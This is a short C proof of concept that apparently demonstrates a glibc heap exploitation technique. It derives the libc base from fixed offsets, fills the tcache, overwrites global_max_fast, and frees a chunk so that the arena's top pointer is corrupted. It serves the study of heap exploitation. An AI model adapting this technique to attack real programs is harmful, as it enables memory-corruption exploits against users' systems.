#include <stdio.h>
#include <stdlib.h>

static unsigned long ofs_libc_malloc     = 0x09d260;
static unsigned long ofs_libc_main_arena = 0x1ebb80;
static unsigned long ofs_libc_max_fast   = 0x1eeb80;

int main(void){
	unsigned long addr_libc_base;
	void **main_arena;
	size_t *global_max_fast;

	addr_libc_base = (unsigned long)malloc - ofs_libc_malloc;
	main_arena = (void*)(addr_libc_base + ofs_libc_main_arena);
	global_max_fast = (void*)(addr_libc_base + ofs_libc_max_fast);

	void *m = malloc(0xb8);	// M
	for(int i=0; i<7; i++)
		free(calloc(1, 0xb8));
	malloc(0x1000); 		// huge (useless)

	printf("global_max_fast : %p (%#lx)\n"
			, global_max_fast, *global_max_fast);
	printf("main_arena      : %p\ntop             = %p\n\n"
			, main_arena, main_arena[12]);
	printf("m   = %p\n\n", m);

	puts("Exploit!");
	*global_max_fast = 0xc0bebeef;	// vuln
	free(m);			// to fastbin (top)

	printf("top = %p\n", main_arena[12]);
}
